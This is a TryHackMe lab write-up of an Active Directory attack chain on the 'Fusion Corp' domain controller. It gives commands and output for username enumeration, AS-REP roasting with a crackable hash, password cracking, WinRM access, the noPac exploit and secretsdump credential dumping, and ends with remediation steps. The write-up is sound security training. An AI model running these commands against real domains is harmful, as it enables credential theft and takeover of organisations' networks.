---
title: Fusion Corp
date: 2026-10-20
platform: TryHackMe
difficulty: Hard
tags:
  - Active Directory
summary: Exposed username on a backup web directory lead to AS-REP Roasting that allowed deeper enumeration towards another user that has domain privileges to take advantage of 2 CVE resulting to full DC compromise.
---
# Room: https://tryhackme.com/room/fusioncorp

![](../Attachments/Pasted%20image%2020261020154345.png)

# Nmap scan

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: eBusiness Bootstrap Template
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-20 08:04:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   DNS_Tree_Name: fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-20T08:04:56+00:00
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2026-10-19T07:44:35
|_Not valid after:  2027-04-20T07:44:35
|_ssl-date: 2026-10-20T08:05:36+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# HTTP

![](../Attachments/Pasted%20image%2020261020162028.png)

## Fuzzing

Their website have an insecure backup of employees names on their website.

```bash
$ gobuster dir -u http://fusion.corp -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,js 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
backup               (Status: 301) [Size: 149] [--> http://fusion.corp/backup/]
```

![](../Attachments/Pasted%20image%2020261020162256.png)

![](../Attachments/Pasted%20image%2020261020162644.png)

This breach of information specially usernames that can be used to perform credential attacks towards the domain is dangerous. 

## Credential attacks

### Username enumeration

This attack allows me to enumerate which username is valid within the target domain.

```bash
$ kerbrute userenum -d fusion.corp users.txt --dc fusion.corp   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/20/26 - Ronnie Flathers @ropnop

2026/10/20 01:34:57 >  Using KDC(s):
2026/10/20 01:34:57 >   fusion.corp:88

2026/10/20 01:34:57 >  [+] VALID USERNAME:       lparker@fusion.corp
2026/10/20 01:34:57 >  Done! Tested 11 usernames (1 valid) in 0.398 seconds
```

### AS-REP Roasting

`AS-REP Roasting` checks for domain users that `DOES NOT REQUIRE KERBEROS PRE-AUTHENTICATION`. 

Attackers use this misconfiguration to harvest encrypted authentication tickets from the Domain Controller and attempt to crack the account passwords offline

```bash
$ GetNPUsers.py fusion.corp/ -usersfile users.txt -request -format hashcat -outputfile asrep.txt                                                                  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$lparker@FUSION.CORP:129a337c01a2ead3252a7c01c8ea1218$80e46aa4dbdd82758ea2bc7981223163d7a41fd008b4121b161087a72d6e947e559aa2f8043f3a2e53e288d54bab7f90e01fd1c256407bc074ec82a191115f391d297b1e8c1a0d207b302719facc1d117f2d64eaca4df96f68189605ab38f7c31f5059ca822497fde62682a34ec42976a3d66488f3e8a3e6cd18259427b82de94cfc6474d6c1461728920808eab4652d55fb64c8bfa770516ea618e2bbfa8448c62d411f0dc2863a8e6c058f25634348cd39f203b58e6badf587346fa333e1c043ff0423887c1161886e6b351cae80c2480f6f7b025717f442423ec3f41087626b0287bc2850694a5d61
```

That is an authenticated ticket encrypt with the user's password. I cracked it offline and got the user's password.

```bash
$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt asrep.txt        
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{REDACTED} ($krb5asrep$23$lparker@FUSION.CORP)     
1g 0:00:00:02 DONE (2026-10-20 01:43) 0.4464g/s 1098Kp/s 1098Kc/s 1098KC/s !@#$%%^PRDAluv..เต่าเกมส์
Use the "--show" option to display all of the cracked passwords reliably
```

Getting a valid credential can result to deeper enumeration and potentially more privilege access.

### LDAP DOMAIN DUMP - Users

This shows the password set for another user resulting to lateral movement. It is also notable that this user is a `Backup Operator` which have additional privilege over the domain.

![](../Attachments/Pasted%20image%2020261020173539.png)

```bash
$ nxc winrm fusion.corp -u jmurphy -p '{REDACTED}'
WINRM       10.146.188.191  5985   FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 (name:FUSION-DC) (domain:fusion.corp) 
WINRM       10.146.188.191  5985   FUSION-DC        [+] fusion.corp\jmurphy:{REDACTED} (Pwn3d!)
```

Plaintext credentials can be used for the machine's services such as `winrm` where I can get a powershell session and interact within the domain controller.

```powershell
*Evil-WinRM* PS C:\Users\jmurphy\desktop> whoami
fusion\jmurphy
*Evil-WinRM* PS C:\Users\jmurphy\desktop> hostname
Fusion-DC
```

`jmurphy` have privileges that can be used for `privilege escalation`. This is over permissive and can be abused. 

```bash
*Evil-WinRM* PS C:\Users\jmurphy\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

As `backup operator` it would make sense to have `BackupPrivilege` and `RestorePrivilege`. `MachineAccountPrivilege` is out of ordinary so I exploited it as I'm more familiar with it. 

There's an exploit called `noPac`. 

NoPac chains two CVEs: 
- `CVE-2021-42278` (SAM account name spoofing) 
- `CVE-2021-42287` (KDC name lookup fallback) it allows any domain user with the ability to create a machine account to impersonate a Domain Controller and get a ticket as DA.

![](../Attachments/Pasted%20image%2020261020184319.png)

This gave me service ticket for the `Administrator` of the `domain controller`. I used it to dump `domain cached credentials` to get the `Administrator's` hash.

```bash
$ secretsdump.py -dc-ip 10.146.135.185 -k -no-pass fusion.corp/Administrator@fusion-DC.fusion.corp
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
```

![](../Attachments/Pasted%20image%2020261020184531.png)

This vulnerability allows an attacker to get shell access using `evil-winrm` + `Pass-the-hash` attack.

![](../Attachments/Pasted%20image%2020261020184039.png)

# Fix

- Install all latest security update released by microsoft across all domain controllers. 
- Set `ms-DS-MachineAccountQuota` in Active Directory to **0** to prevent standard users from creating computer accounts.
- Secure Backup files in the web service.

# Flags


```bash
*Evil-WinRM* PS C:\Users> type C:\Users\lparker\Desktop\flag.txt
THM{REDACTED} # User 1

*Evil-WinRM* PS C:\Users> type C:\Users\jmurphy\Desktop\flag.txt
THM{REDACTED} # User 2

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
THM{REDACTED} # User 3


```




